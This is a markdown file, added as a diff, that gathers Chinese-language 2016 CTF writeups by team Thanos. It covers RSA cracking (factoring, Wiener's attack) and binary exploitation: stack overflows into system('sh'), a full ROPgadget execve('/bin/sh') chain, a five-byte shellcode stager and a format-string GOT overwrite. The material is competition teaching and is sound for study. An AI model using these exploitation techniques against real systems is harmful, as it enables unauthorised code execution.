@@ -1,0 +1,1735 @@
+<!--
+LICENSE UPL
+Author: Mauro Risonho de Paula Assumpção
+Data Create: 2026-03-16
+Data Update: 2026-03-16
+-->
+
+---
+name: writeup-ctf-thanos
+description: CTF writeups and security challenges by CTF-Thanos.
+---
+
+# Writeups by CTF-Thanos
+
+Source repository: `/repos/CTF-Thanos`
+
+## Repository Index
+
+- ctf-writeups/README.md
+- ctf-writeups/2016/SCTF/README.md
+- ctf-writeups/2016/google_ctf/README.md
+- ctf-writeups/2016/whctf/re200/README.md
+- ctf-writeups/2016/google_ctf/Web/Ernst Echidna/README.md
+- ctf-writeups/2016/google_ctf/Web/Spotted Quoll/README.md
+- ctf-writeups/2016/google_ctf/Forensics/In Recorded Conversation/README.md
+- ctf-writeups/2016/google_ctf/Forensics/No Big Deal/README.md
+- ctf-writeups/2016/bctf/reverse/LostFlower/README.md
+- ctf-writeups/2016/bctf/crypto/special_rsa/README.md
+- ctf-writeups/2016/alictf/ColorOverflow/README.md
+- ctf-writeups/2016/alictf/REact/README.md
+- ctf-writeups/2016/alictf/debug/README.md
+- ctf-writeups/2016/SCTF/code/code100/README.md
+- ctf-writeups/2016/SCTF/code/code150/README.md
+- ctf-writeups/2016/SCTF/code/code300/README.md
+- ctf-writeups/2016/CCTF/pwn/pwn2/README.md
+- ctf-writeups/2016/CCTF/pwn/pwn3/README.md
+- ctf-writeups/2016/429ctf/pwn/pwn1/README.md
+- ctf-writeups/2016/429ctf/pwn/pwn2/README.md
+- ctf-writeups/2016/429ctf/pwn/pwn3/README.md
+- ctf-writeups/2016/429ctf/crypto/RasRoll/README.md
+
+## Writeup Content
+
+
+### File: ctf-writeups/2016/429ctf/crypto/RasRoll/README.md
+
+## RsaRoll (crypto, 350p)
+
+RSA roll! roll! roll!, only number an a-z (don't use the editor which MS provide)
+ 
+[RsaRoll.zip](./570f947da6a6a.zip)
+
+---------------------------------------
+
+### 思路
+题目的提示是想让人去枚举爆破，但实际不需要，因为`N`很小。解压文件后，发现`data.txt`的第一行应该就是公钥`{920139713,19}`，用`RSATool`分解`N`，很快就得到`p`和`q`,再计算出`d`。
+
+![rsatool.png](./image/rsatool.png)
+
+然后根据RSA加密原理：
+```
+m^e = c (mod N)  # 加密公式
+c^d = m (mod N)  # 解密公式
+```
+
+写个脚本跑下就出来了[ans.py](./ans.py)
+
+
+### File: ctf-writeups/2016/429ctf/pwn/pwn1/README.md
+
+## pwn1 (pwn, 250p)
+
+提供了以下文件：  
+[pwn1](./pwn1)
+
+---------------------------------------
+
+### 0x1 分析程序
+执行下程序，再用IDA分析下，发现有个`strcpy`溢出漏洞，如果一开始的输入的name过长，再选择`1 Show the information`将导致程序溢出。查看下需要多少个字节才能溢出，在IDA的伪代码中：
+
+![pwn1_1.png](./image/pwn1_1.png)
+
+```
+# dest在栈中的位置
+-00000088 dest            db 2 dup(?)
+-00000086 var_86          dw ?
+-00000084                 db ? ; undefined
+...
+-00000002                 db ? ; undefined
+-00000001                 db ? ; undefined
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)             ; return address
++00000008 src             dd ?                    ; offset
++0000000C
++0000000C ; end of stack variables
+```
+可以看到140（0x88+4）个字节后将溢出覆盖返回地址。
+
+### 0x2 构造exp
+查看可以利用的plt函数
+``` 
+$ objdump -d -j .plt pwn1
+# 下面是回显，省略了部分内容
+080484a0 <puts@plt>:
+ 80484a0:   ff 25 1c a0 04 08       jmp    *0x804a01c
+ 80484a6:   68 20 00 00 00          push   $0x20
+ 80484ab:   e9 a0 ff ff ff          jmp    8048450 <_init+0x24>
+
+080484b0 <system@plt>:
+ 80484b0:   ff 25 20 a0 04 08       jmp    *0x804a020
+ 80484b6:   68 28 00 00 00          push   $0x28
+ 80484bb:   e9 90 ff ff ff          jmp    8048450 <_init+0x24>
+```
+
+有了system函数，那再用ROPgadget找下是否有`/bin/sh`或`sh`字符串
+
+``` 
+$ ROPgadget --binary pwn1 --string "/bin/sh\0"
+Strings information
+============================================================
+
+$ ROPgadget --binary pwn1 --string "sh\0"
+Strings information
+============================================================
+0x080482ea : shs
+```
+
+发现程序里确实有`sh`字符串，那exp也出来了。详细exp内容请看[exp2.py](./exp2.py)
+
+### 0x3 结束语
+总体来说，这题还是比较简单的。但在比赛时并不知道可以直接用`system（sh）`，还以为要找到`/bin/sh`，而程序里没有找到。所以用另外的思路：看到程序要依赖`libc.so.6`，但由于服务器开启了ASLR，必须通过偏移量来得到正确的地址，这样子写出的exp比较复杂。有兴趣请看[exp.py](./exp.py)
+
+
+
+### File: ctf-writeups/2016/429ctf/pwn/pwn2/README.md
+
+## pwn2 (pwn, 350p)
+
+提供了以下文件：  
+[pwn2](./pwn2)
+
+---------------------------------------
+
+### 0x1 分析程序
+执行下程序，再用IDA分析下，发现有个`memcpy`溢出漏洞，如果一开始的输入的calculate次数过多，再选择`5 Save the result`将导致程序溢出。查看下需要多少个字节才能溢出，在IDA的伪代码中,可以看到`memcpy`是copy到`&v5`指向的地址里。
+
+```
+      case 5:
+        memcpy(&v5, v7, 4 * v6);
+        free(v7);
+        return 0;
+```
+
+查看下`v5`在栈中的地址偏移情况：
+
+```
+-00000034 v5              dd ?
+-00000030 var_30          dd ?
+-0000002C var_2C          dd ?
+-00000028 var_28          dd ?
+-00000024 var_24          dd ?
+-00000020 var_20          dd ?
+-0000001C var_1C          dd ?
+-00000018 var_18          dd ?
+-00000014 var_14          dd ?
+-00000010 var_10          dd ?
+-0000000C v6              dd ?
+-00000008 v7              dd ?
+-00000004 v8              dd ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)			  ; return address
++00000008 argc            dd ?
++0000000C argv            dd ?                    ; offset
++00000010 envp            dd ?                    ; offset
++00000014
++00000014 ; end of stack variables
+```
+可以看到56（0x34+4）个字节后将溢出覆盖返回地址。
+
+### 0x2 构造exp
+发现程序里没有`system`或`execv`等函数, 但这个程序貌似是静态链接编译的,指令应该比较丰富,用ROPgadget尝试生成ropchain。
+
+```
+$ ROPgadget --binary pwn2 --ropchain
+	#!/usr/bin/env python2
+	# execve generated by ROPgadget
+
+	from struct import pack
+
+	# Padding goes here
+	p = ''
+
+	p += pack('<I', 0x0806ed0a) # pop edx ; ret
+	p += pack('<I', 0x080ea060) # @ .data
+	p += pack('<I', 0x080bb406) # pop eax ; ret
+	p += '/bin'
+	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x0806ed0a) # pop edx ; ret
+	p += pack('<I', 0x080ea064) # @ .data + 4
+	p += pack('<I', 0x080bb406) # pop eax ; ret
+	p += '//sh'
+	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x0806ed0a) # pop edx ; ret
+	p += pack('<I', 0x080ea068) # @ .data + 8
+	p += pack('<I', 0x08054730) # xor eax, eax ; ret
+	p += pack('<I', 0x080a1dad) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x080481c9) # pop ebx ; ret
+	p += pack('<I', 0x080ea060) # @ .data
+	p += pack('<I', 0x0806ed31) # pop ecx ; pop ebx ; ret
+	p += pack('<I', 0x080ea068) # @ .data + 8
+	p += pack('<I', 0x080ea060) # padding without overwrite ebx
+	p += pack('<I', 0x0806ed0a) # pop edx ; ret
+	p += pack('<I', 0x080ea068) # @ .data + 8
+	p += pack('<I', 0x08054730) # xor eax, eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x0807b75f) # inc eax ; ret
+	p += pack('<I', 0x08049781) # int 0x80
+```
+
+good，有了ropchain，那就容易了。到这里我们构造出的payload大概如下：
+```
+payload = 'A'*56 + ropchain
+```
+
+但测试后发现不行，运行后报abort，也生成了core文件。用`gdb pwn2 core`查看出错原因，发现是`free`函数报错了。原来`memcpy`后就执行`free(v7)`, 而`v7`保存的是之前`malloc	`的地址。由于溢出也把`v7`的值也覆盖了，所以导致`free`报abort。这时队友esrever10说试试`free(0)`,果然是可以的，大赞^_^！  
+
+`free`问题解决了，但又遇到新问题，在执行`mov dword ptr [edx], eax`时报错，报写入地址不正确，调试后发现`edx`这时的值为0，这不科学，明明上面给`edx`赋值了。找了好久也没找到原因，最后灵机一动，把给`edx`赋值的语句多copy一次。nice，终于搞定了。全部代码请看[exp.py](./exp.py)
+
+
+### 0x3 后续
+esrever10看了这题后发现之前写入地址不对应该是`and     esp, 0FFFFFFF0h`导致，
+```
+.text:08048E24 55                          push    ebp
+.text:08048E25 89 E5                       mov     ebp, esp
+.text:08048E27 83 E4 F0                    and     esp, 0FFFFFFF0h
+.text:08048E2A 83 EC 50                    sub     esp, 50h
+```
+分析了下，确实是这样的，对齐esp可能导致esp偏移了4/8/12个字节，由于IDA也不知道运行中的esp的值，所以未能显示出这一情况。对于这种情况，最好的解决方案应该是插入三个指向ret指令的地址，相当于继续往下执行，忽略不稳定因素。
+
+
+
+### File: ctf-writeups/2016/429ctf/pwn/pwn3/README.md
+
+## pwn1 (pwn, 250p)
+
+提供了以下文件：  
+[pwn3](./pwn3)
+
+---------------------------------------
+
+### 0x1 分析程序
+执行下程序，再用IDA分析下，一时没找到漏洞。
+``` c
+int sub_80485E7()
+{
+  int v1; // [sp+10h] [bp-48h]@2
+  int v2; // [sp+14h] [bp-44h]@2
+  int v3; // [sp+18h] [bp-40h]@6
+  int j; // [sp+1Ch] [bp-3Ch]@6
+  int i; // [sp+20h] [bp-38h]@1
+  int buf[13]; // [sp+24h] [bp-34h]@1
+
+  memset(buf, 0, 40u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    puts("enter index");
+    fflush(stdout);
+    __isoc99_scanf("%d", &v1);
+    puts("enter value");
+    fflush(stdout);
+    __isoc99_scanf("%d", &v2);
+    if ( v1 > 9 )
+      exit(0);
+    buf[v1] = v2;
+  }
+  puts("your input");
+  v3 = fflush(stdout);
+  for ( j = 0; j <= 9; ++j )
+  {
+    printf("%d ", buf[j]);
+    v3 = fflush(stdout);
+  }
+  return v3;
+}
+```
+
+下标`v1`的值是输入得来的，只要小于9就可以，那么也可以为负数。但往低地址写数据，这不能覆盖返回地址是没意义的。苦思冥想许久，无意间看了下对应的汇编:
+```
+.text:08048683                 mov     [ebp+eax*4+buf], edx
+```
+
+恩，这是个int数组，偏移是下标乘以4，那么就可能发生整数溢出，将负数变正数。再想想乘以4，其实就是左移2位。那么实际要写的偏移量先右移2位，再把最高位置1（变成负数）就即。这里还要注意一点是程序采用`%d`来读取数字，最大的正整数是2147483647，如果输入的数字比较这个大，那么`v1`还是2147483647。所以我们必须显式输入一个负数。可以采用ctypes.c_int来得到相应的负数形式，如下：
+
+``` python
+from ctypes import c_int
+
+def chg(x):
+	assert(x & 3 == 0)
+	tmp = c_int(0x80000000 | (x >> 2))
+	return str(tmp.value)
+```	
+
+下面的思路和pwn1基本是一样的，先查看下需要多少个字节才能溢出，在IDA的伪代码中：
+
+```
+# buf在栈中的位置
+-00000048 v1              dd ?
+-00000044 v2              dd ?
+-00000040 v3              dd ?
+-0000003C j               dd ?
+-00000038 i               dd ?
+-00000034 buf             dd 13 dup(?)
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008
++00000008 ; end of stack variables
+```
+可以看到56（0x34+4）个字节后将溢出覆盖返回地址。
+
+### 0x2 构造exp
+查看可以利用的plt函数
+``` 
+$ objdump -d -j .plt pwn3
+# 下面是回显，省略了部分内容
+08048410 <puts@plt>:
+ 8048410:	ff 25 14 a0 04 08    	jmp    *0x804a014
+ 8048416:	68 10 00 00 00       	push   $0x10
+ 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x24>
+
+08048420 <system@plt>:
+ 8048420:	ff 25 18 a0 04 08    	jmp    *0x804a018
+ 8048426:	68 18 00 00 00       	push   $0x18
+ 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x24>
+```
+
+有了system函数，那再用ROPgadget找下是否有`/bin/sh`或`sh`字符串
+
+``` 
+$ ROPgadget --binary pwn3 --string "/bin/sh\0"
+Strings information
+============================================================
+
+$ ROPgadget --binary pwn3 --string "sh\0"
+Strings information
+============================================================
+0x080482ae : she
+```
+
+发现程序里确实有`sh`字符串，那exp也出来了。详细exp内容请看[exp2.py](./exp2.py)
+
+### 0x3 结束语
+1. 在比赛时并不知道可以直接用`system（sh）`，所以跟pwn1一样采用了相同的方式得到了`/bin/sh`地址。有兴趣请看[exp.py](./exp.py)
+2. 在pwn2中是采用`%u`来读取数字的，不用考虑地址是否大于`0x7fffffff`。而这题中是采用`%d`来读取数字的，如果地址过大，要转换为对应的负数形式来进行输入。
+
+
+### File: ctf-writeups/2016/CCTF/pwn/pwn2/README.md
+
+## pwn2 (pwn, 200p)
+
+提供了以下文件：  
+[pwn2](./pwn2)
+
+---------------------------------------
+
+### 0x1 分析程序
+用IDA看下伪代码：
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *v3; // eax@1
+  char *v4; // ST28_4@1
+  const char *v5; // ST2C_4@1
+
+  v3 = mmap((void *)0x31337000, 4096u, 7, 34, 0, 0);
+  v4 = (char *)v3;
+  v5 = (char *)v3 + 4090;
+  gets((char *)v3 + 4090);
+  strncpy(v4, v5, 5u);
+  return ((int (*)(void))v4)();
+}
+```
+
+程序逻辑十分简单，如下。用`mmap`分配了块4096个字节的可写可读可执行的内存块。用'gets'读入6个字节，但其实只有5个可以控制，第六个为`\n`，超过6个字节报错。之后把这前5个字节copy到内存块头，并执行。看到这里，就知道关键在于输入的5个字节。这5个字节的要完成什么功能呢？
+
+
+### 0x2 构造exp
+看下程序的汇编代码：
+
+```
+.text:0804847D                 push    ebp
+.text:0804847E                 mov     ebp, esp
+.text:08048480                 and     esp, 0FFFFFFF0h
+.text:08048483                 sub     esp, 30h
+.text:08048486                 mov     dword ptr [esp+14h], 0 ; offset
+.text:0804848E                 mov     dword ptr [esp+10h], 0 ; fd
+.text:08048496                 mov     dword ptr [esp+0Ch], 22h ; flags
+.text:0804849E                 mov     dword ptr [esp+8], 7 ; prot
+.text:080484A6                 mov     dword ptr [esp+4], 1000h ; len
+.text:080484AE                 mov     dword ptr [esp], 31337000h ; addr
+.text:080484B5                 call    _mmap
+.text:080484BA                 mov     [esp+28h], eax
+.text:080484BE                 mov     eax, [esp+28h]
+.text:080484C2                 add     eax, 0FFAh
+.text:080484C7                 mov     [esp+2Ch], eax
+.text:080484CB                 mov     eax, [esp+2Ch]
+.text:080484CF                 mov     [esp], eax      ; s
+.text:080484D2                 call    _gets
+.text:080484D7                 mov     dword ptr [esp+8], 5 ; n
+.text:080484DF                 mov     eax, [esp+2Ch]
+.text:080484E3                 mov     [esp+4], eax    ; src
+.text:080484E7                 mov     eax, [esp+28h]
+.text:080484EB                 mov     [esp], eax      ; dest
+.text:080484EE                 call    _strncpy
+.text:080484F3                 mov     eax, [esp+28h]
+.text:080484F7                 call    eax
+.text:080484F9                 leave
+.text:080484FA                 retn
+.text:080484FA main            endp
+```
+首先我们看到只有5个字节肯定是完成不了exploit的，必须让它输入更多的opcode。所以考虑要跳转到`gets`语句，让我们可以输入更多的opcode。假如`gets`参数如果还是`0x31337FFA`(0x31337000+4090)的话，那没有变化，还是只能输入5个字节。要想办法可以输入更多的字节，我们看下执行后`.text:080484F7  call eax` 后栈的情况：
+
+```
+esp+0   ->    0x080484F9    ; return address
+esp+4         0x31337000    ; strncpy的第一个参数 
+esp+8         0x31337FFA    ; strncpy的第二个参数
+esp+0c        0x00000005    ; strncpy的第三个参数
+```
+
+如果把0x080484F9当`gets`的参数，那么执行将报错，因为`.text`段不可写。但是如果把`0x31337000`当做`gets`的参数，那么是非常好的事情，这样我们可以输入4095个字节的opcode，而且还是可执行的。按照这思路，要把EIP变为`0x080484D2`，并且esp+4。发现`0x080484F9`和`0x080484D2`只有最低的字节不同，是否可以改变下，然后再来个`ret`呢？借助pwntools的`asm`指令，我们得到这个功能的opcode，正好它也是5个字节长度，nice。
+
+```
+$ asm "mov byte ptr [esp], 0xd2; ret"
+c60424d2c3
+
+$ asm "sub dword ptr [esp], 0x27; ret"
+832c2427c3
+```
+
+之后，我们可以输入`execve ("/bin/sh")`的shellcode，并执行即可。详细代码请看[pwn2_exp.py](./pwn2_exp.py)
+
+
+
+
+
+### File: ctf-writeups/2016/CCTF/pwn/pwn3/README.md
+
+## pwn3 (pwn, 350p)
+
+提供了以下文件：  
+[pwn3](./pwn3)
+
+---------------------------------------
+
+### 0x1 分析程序
+执行下程序，发现要输入用户名，用IDA分析下，是简单的凯撒加密，算下就得到用户名了：
+
+```
+username = bytearray("sysbdmin")
+for i in range(len(username)):
+    username[i] -= 1
+print username
+
+# below is the output:
+# rxraclhm
+```
+
+继续往后分析，发现是一个类似ftp服务器的程序，可以输入`put|get|dir`三个命令。
++ 1. put: 用`malloc`分配244个字节，建立如以下数据结构，多次的put将形成一条链表。
+```
+struct _FILE {
+	char filename[40]; 
+	char content[200];
+	struct _FILE *previous;
+};
+```
+
++ 2. get: 要求先输入filename，然后遍历链表，匹配filename，找到则输出内容。找不到的话，是输出当前栈里的内容。
+```
+int get_file()
+{
+  char dest; // [sp+1Ch] [bp-FCh]@5
+  char s1; // [sp+E4h] [bp-34h]@1
+  char *i; // [sp+10Ch] [bp-Ch]@3
+
+  printf("enter the file name you want to get:");
+  __isoc99_scanf("%40s", &s1);
+  if ( !strncmp(&s1, "flag", 4u) )
+    puts("too young, too simple");
+  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
+  {
+    if ( !strcmp(i, &s1) )
+    {
+      strcpy(&dest, i + 40);
+      return printf(&dest);
+    }
+  }
+  return printf(&dest);
+}
+```
+
++ 3. dir: 遍历链表，将所有的的filename串起来输出。
+
+
+一开始以为是put和dir形成了漏洞，因为put的时候可以输入40个字节长度的filename,导致dir命令在复制的时候可以溢出。后来测试后发现不可行，溢出后覆盖了其它局部变量，导致访问异常，要设置正确的值，太难了。
+后来和esrever10交流的时候，说可能是`printf(&dest)`有问题，格式化字符串漏洞，马上搜了些关于格式化字符串漏洞的文章来看，发现确实是这里可以利用。见识还是太少了，仍需好好积累。
+
+### 0x2 构造exp
+借助格式化字符串漏洞，我们可以：
++ 1. 读取任意地址的内容
++ 2. 设置任意地址的内容
+
+由于服务器开了ASLR，思路是这样的：
++ 1. 先读取`puts@got`的内容，得到`puts`的地址，之后通过lib中偏移量固定的方式算出`system`的地址
++ 2. 将`system`地址写到`puts@got`里
++ 3. 让程序去执行`puts('/bin/sh')`, 这时实际是执行`system('/bin/sh')`
+
+详细代码请看[pwn3_exp.py](./pwn3_exp.py)
+
+### 0x3 总结
++ 本来是直接用`%n`直接一次写4个字节，但测试的时候，发现由于要输出太多字符，程序崩溃了。后来改用`%hhn`，一次只写一个字节，分四次写入。
++ 如果刚好是要写的数字是0，可以换成256，由于溢出了，最后的值还是0。有了这个认识，那么可以做到在一次`printf`里使用多次`%hhn`写多个字节。
++ 其实`system('/bin/sh;abcdefg12334')`也可以达到效果，不用强求用`system('/bin/sh')`
++ 可以用$修饰符直接操作我们感兴趣的参数，例如`8$`将操作format后的第8个参数
+```
+int a = 1, b = 2;
+printf("%2$d, %1$d\n", a, b);
+
+// below is the output:
+// 2, 1
+```
+
+### 0x4 参考资料
++ [格式化字符串漏洞简介](http://drops.wooyun.org/binary/7714)
++ [二进制漏洞之——邪恶的printf](http://drops.wooyun.org/binary/6259)
++ [SEED实验系列：格式化字符串漏洞实验 ](http://www.freebuf.com/articles/network/62473.html)
++ [shellcode之四：格式化串漏洞 ](http://blog.csdn.net/azloong/article/details/6158458)
+
+
+
+
+### File: ctf-writeups/2016/SCTF/README.md
+
+#SCTF 2016
+
++ Team: Thanos
++ Rank: 29
++ Score: 760
+
+
+
+### File: ctf-writeups/2016/SCTF/code/code100/README.md
+
+## Code100 (crypto, 100p)
+
+藤原暮雨精通RSA加密算法，他在通往宝藏的路上设置了层层加密(level by level)。那晚，在天台山，L3m0n输给了藤原暮雨，他用惯性漂移过弯，他的车很快，L3m0n只看到他有个x86的招牌……
+
+烫了头的L3m0n毕竟是SYC颜值担当的组草，虽然输给了天台山车神藤原暮雨，但是已经暗中掌握了一些线索，现在他提供了level0到level2的公钥和密文，你能解开线索拿到FLAG进入到SYC Security System的入口吗？
+ 
+[RSA_01.zip](./RSA_01.zip)
+
+---------------------------------------
+
+###　level0
+解压文件后，发现有一个公钥，一个下一层的压缩包（解压需要密码），还有一个加密了的密码文件。现在需要先解密密码文件，获得下一层的密码。首先用`openssl`查看公钥，获取`N`和`e`:
+
+```
+$ openssl rsa -in public.key -pubin -noout -text -modulus
+
+Public-Key: (2048 bit)
+Modulus:
+    00:94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:
+    89:d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:
+    70:87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c:
+    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:
+    bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8:
+    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:
+    ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a:
+    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:
+    72:1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5:
+    16:36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac:
+    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:
+    31:56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49:
+    cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69:
+    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:
+    86:94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20:
+    eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46:
+    b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06:
+    68:81
+Exponent: 65537 (0x10001)
+Modulus=94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881
+
+```
+
+之后用`RSATool`分解`N`，不到10秒就分解出来了，得到`p`和`q`。借助[rsatool.py](https://github.com/ius/rsatool)生成私钥：
+```
+$ rsatool.py -p 0xE3DA86D196DD -q 0xA6FC47CA0C3F596B9585BFC491B7515EC5F0701AA5196DF0BB79F75777D12A7EF593B3E2D4D22B32570A5FC9509290542F24FD426C5C631D5F58838A5978DB3980A11340DDFBC4E71B689EB5941876DAC7B2D365332790B8889CB671BEE06EE1CE0DE7E782BFC9400FFC3F8E1F69B67170782E94D2237A95153CC85512561F32EABE939468CC875E4068F51548B69F0C4C9B4C0E2CA3A8EE56A975336B21416B397E272DBD0D0F193EAE8D865E496C30E2A91837042F94E685C0E03659BE760E35977AEA5DAF5D892D09485388253716E7195B18FFFFA796908EA839FD4937695B0F5CA091D19E1B90D4156E0E0A102325D98FCFCAC91F3F33F5 -o private.pem 
+```
+
+本来打算直接`openssl`解密的，但密码文件貌似还用base64加密了，用`base64`指令先解密后，在用`openssl`解密也不行。之后尝试用代码`pow(enc, d, N)`来解密，但解密后内容也不对（现在猜测是有padding的原因）。后来借助`Crypto`库，解密成功。代码如下:
+
+``` python
+def decrypt_RSA(private_key_loc, package):
+	from Crypto.PublicKey import RSA 
+	from Crypto.Cipher import PKCS1_OAEP 
+	key = open(private_key_loc, "r").read() 
+	rsakey = RSA.importKey(key) 
+	rsakey = PKCS1_OAEP.new(rsakey) 
+	decrypted = rsakey.decrypt(package) 
+	return decrypted
+
+from base64 import b64decode
+enc = open('level1.passwd.enc', 'r').read()
+print decrypt_RSA('private.pem', b64decode(enc))
+
+# below is output:
+# FaC5ori1ati0n_aTTA3k_p_tOO_sma11
+
+```
+
+### level1
+用`FaC5ori1ati0n_aTTA3k_p_tOO_sma11`解压成功，进入`level1`中，发现和`level0`一样，给了三个文件。还是先用`openssl`查看公钥，获得`N`和`e`，之后用`RSATool`分解`N`，但这次分解了一个小时都没跑出来，这时队友`shell-von`说试试`yafu`，果然，`yafu`一下就跑出结果了：
+
+```
+>> factor(0xC3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0
+E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E
+4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8C
+E9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1
+651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C18
+1267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994
+B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D)
+
+fac: factoring 24635380199162576175626733825654993088774186468424341251485528171
+53939283932914641261501336298028349219948229625022944392589918394160128209233284
+34766172771561845076859281935196237658557829760473638836652834244735458779697187
+10272046261654326391840252190462805782777380937446430987284386172226304759726517
+52984356441209198432898097911511115862467385516637922141593521720692098056490041
+46710648271671874179324755835095998026482385736032984284451779573928939284923535
+38844661418085667022331283805225000341955464473332333141637604132197773189903937
+879276873131228814365139541968760521539920817629563995110317306270531197
+fac: using pretesting plan: normal
+fac: no tune info: using qs/gnfs crossover of 95 digits
+div: primes less than 10000
+fmt: 1000000 iterations
+Total factoring time = 13.6719 seconds
+
+
+***factors found***
+
+P309 = 1569566188447068203970128911685125610161729262744064093516052048758488941
+34762425857160007206769208250966468865321072899370821460169563046304363342283383
+73044885588755971466243820660078044307112563439451197610897941730207828977384770
+6397371335621757603520669919857006339473738564640521800108990424511408496383
+P309 = 1569566188447068203970128911685125610161729262744064093516052048758488941
+34762425857160007206769208250966468865321072899370821460169563046304363342283383
+73044885588755971466243820660078044307112563439451197610897941730207828977384770
+6397371335621757603520669919857006339473738564640521800108990424511408496259
+
+ans = 1
+
+```
+
+有`p`和`q`,用`rsatool.py`生成私钥，再用`openssl`解密：
+```
+$ openssl rsautl -decrypt -in level2.passwd.enc -inkey private.pem 
+fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS
+```
+
+### level2
+用`fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS`解压成功，进入`level2`中，发现和`level0`一样，给了三个文件。还是先用`openssl`查看公钥，获得`N`和`e`，之后用`RSATool`分解`N`,不成功；再用`yafu`分解，也分解不出来。发现这次的`N`有些小，`e`有点大，那么`d`可能比较小，想起[wiener's attack](https://en.wikipedia.org/wiki/Wiener%27s_attack),借助[attackrsa.py](https://github.com/rk700/attackrsa)试了下，发现可以：
+
+```
+$ python attackrsa.py -e 0x01008e81dda0e31928e8ee511108c7505f613105d2e2ff9b8371e429c2dd927065d4096d58c3763107f1d4fccf2db30a6d027c56617cbe7e0b7ed92228669efb3d2f2c20593c21efff31006afba768de4a0a4c1aa709d54898c81fcffbddf79caeae0b15f4b2c7e0bcba314f5e0783ad0e7fb982a4d201fa68296d667ccf57b94b -n 0x1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 -t wiener
+====== Cracked! =======
+d is 0x421996b7ba5429bc8a9b374b74398e63f9e68fc5d95dd3d3c17ed23790bb21b3L
+p is 0x161868c2cc72325ff48427339a9c097dfc12718a7bcb30f551686a8fe5b678b2b9937f9ae4dd0427dfbf1ab2fff58930a9669f4a4795cbfdddc4df9472c9ef7dd
+q is 0x1401a7c1bc07aa25c48a39fc52896806b41795e92a1acf81a09032f3b14159e8c3bdebdb223a39535e9164ee66e3b41d31b14ebb3de93aefc8f5df6e47eb8558f
+```
+
+由于`openssl`解密失败，自己用`pow`解密了下：
+
+``` python
+n = 0x1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573
+d = 29897859398360008828023114464512538800655735360280670512160838259524245332403
+
